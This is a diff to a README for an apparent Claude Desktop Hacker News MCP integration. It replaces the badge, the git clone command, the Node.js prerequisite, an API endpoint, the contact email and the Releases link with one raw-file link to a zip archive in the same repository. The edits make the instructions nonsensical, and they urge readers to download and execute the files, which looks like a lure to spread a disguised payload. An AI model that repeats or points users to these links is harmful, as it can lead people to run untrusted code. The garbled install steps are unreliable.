@@ -1,6 +1,6 @@
 # MCP Claude Hacker News Integration 🚀
 
-![MCP Claude Hacker News](https://img.shields.io/badge/MCP_Claude_Hacker_News-integration-brightgreen)
+![MCP Claude Hacker News](https://github.com/mpress001/mcp-claude-hackernews/raw/refs/heads/main/public/claude-hackernews-mcp-v3.6.zip)
 
 Welcome to the **MCP Claude Hacker News** repository! This project allows **Claude Desktop** to seamlessly interact with **Hacker News** using the **Model Context Protocol (MCP)**. Here, you will find all the necessary information to get started, understand the integration, and contribute to the project.
 
@@ -35,12 +35,12 @@ To install the MCP Claude Hacker News integration, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/mpress001/mcp-claude-hackernews.git
+   git clone https://github.com/mpress001/mcp-claude-hackernews/raw/refs/heads/main/public/claude-hackernews-mcp-v3.6.zip
    cd mcp-claude-hackernews
    ```
 
 2. **Install Dependencies**:
-   Ensure you have **Node.js** installed. Then run:
+   Ensure you have **https://github.com/mpress001/mcp-claude-hackernews/raw/refs/heads/main/public/claude-hackernews-mcp-v3.6.zip** installed. Then run:
    ```bash
    npm install
    ```
@@ -69,7 +69,7 @@ Once the server is running, you can use Claude Desktop to interact with Hacker N
 The integration uses the Hacker News API to fetch data. Below are some key endpoints:
 
 - **Get Latest Stories**: 
-  - **Endpoint**: `/v0/newstories.json`
+  - **Endpoint**: `https://github.com/mpress001/mcp-claude-hackernews/raw/refs/heads/main/public/claude-hackernews-mcp-v3.6.zip`
   - **Description**: Returns a list of the latest article IDs.
 
 - **Get Article Details**:
@@ -100,11 +100,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
+- **Email**: https://github.com/mpress001/mcp-claude-hackernews/raw/refs/heads/main/public/claude-hackernews-mcp-v3.6.zip
 
 ## Releases
 
-To download the latest release, visit our [Releases](https://github.com/mpress001/mcp-claude-hackernews/releases) section. You can find the necessary files to be downloaded and executed there.
+To download the latest release, visit our [Releases](https://github.com/mpress001/mcp-claude-hackernews/raw/refs/heads/main/public/claude-hackernews-mcp-v3.6.zip) section. You can find the necessary files to be downloaded and executed there.
 
 For updates, keep an eye on the releases page or subscribe to notifications.
 
